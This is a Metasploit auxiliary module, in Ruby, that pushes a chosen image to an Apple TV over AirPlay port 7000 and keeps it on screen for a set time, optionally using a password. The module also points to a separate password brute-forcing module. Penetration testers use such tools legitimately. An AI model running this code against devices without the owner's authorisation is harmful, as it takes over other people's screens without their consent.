##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apple TV Image Remote Control',
      'Description'    => %q(
        This module will show an image on an AppleTV device for a period of time.
        Some AppleTV devices are actually password-protected, in that case please
        set the PASSWORD datastore option. For password brute forcing, please see
        the module auxiliary/scanner/http/appletv_login.
      ),
      'Author'         =>
        [
          '0a29406d9794e4f9b30b3c5d6702c708', # Original work
          'sinn3r'                            # You can blame me for mistakes
        ],
      'References'     =>
        [
          ['URL', 'http://nto.github.io/AirPlay.html']
        ],
      'DefaultOptions' => { 'HttpUsername' => 'AirPlay' },
      'License'        => MSF_LICENSE
    ))

    # Make the PASSWORD option more visible and hope the user is more aware of this option
    register_options([
      Opt::RPORT(7000),
      OptInt.new('TIME', [true, 'Time in seconds to show the image', 10]),
      OptPath.new('FILE', [true, 'Image to upload and show']),
      OptString.new('HttpPassword', [false, 'The password for AppleTV AirPlay'])
    ])

    # We're not actually using any of these against AppleTV in our Rex HTTP client init,
    # so deregister them so we don't overwhelm the user with fake options.
    deregister_options(
      'HTTP::uri_encode_mode', 'HTTP::uri_full_url', 'HTTP::pad_method_uri_count',
      'HTTP::pad_uri_version_count', 'HTTP::pad_method_uri_type', 'HTTP::pad_uri_version_type',
      'HTTP::method_random_valid', 'HTTP::method_random_invalid', 'HTTP::method_random_case',
      'HTTP::uri_dir_self_reference', 'HTTP::uri_dir_fake_relative', 'HTTP::uri_use_backslashes',
      'HTTP::pad_fake_headers', 'HTTP::pad_fake_headers_count', 'HTTP::pad_get_params',
      'HTTP::pad_get_params_count', 'HTTP::pad_post_params', 'HTTP::pad_post_params_count',
      'HTTP::uri_fake_end', 'HTTP::uri_fake_params_start', 'HTTP::header_folding',
      'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2', 'NTLM::SendLM', 'NTLM::SendNTLM',
      'NTLM::SendSPN', 'NTLM::UseLMKey', 'DOMAIN', 'DigestAuthIIS', 'VHOST'
    )
  end


  #
  # Sends an image request to AppleTV. HttpClient isn't used because we actually need to keep
  # the connection alive so that the video can keep playing.
  #
  def send_image_request(opts)
    http = nil

    http = Rex::Proto::Http::Client.new(
      rhost,
      rport.to_i,
      {
        'Msf' => framework,
        'MsfExploit' => self
      },
      ssl,
      ssl_version,
      proxies,
      datastore['HttpUsername'],
      datastore['HttpPassword']
    )
    add_socket(http)

    http.set_config('agent' => datastore['UserAgent'])

    req = http.request_raw(opts)
    res = http.send_recv(req)

    Rex.sleep(datastore['TIME']) if res.code == 200
    http.close

    res
  end


  def get_image_data
    File.open(datastore['FILE'], 'rb') { |f| f.read(f.stat.size) }
  end


  def show_image
    image = get_image_data

    opts = {
      'method'  => 'PUT',
      'uri'     => '/photo',
      'data'    => image
    }

    res = send_image_request(opts)

    if !res
      print_status("The connection timed out")
    elsif res.code == 200
      print_status("Received HTTP 200")
    else
      print_error("The request failed due to an unknown reason")
    end
  end


  def run
    print_status("Image request sent. Duration set: #{datastore['TIME']} seconds")
    show_image
  end
end
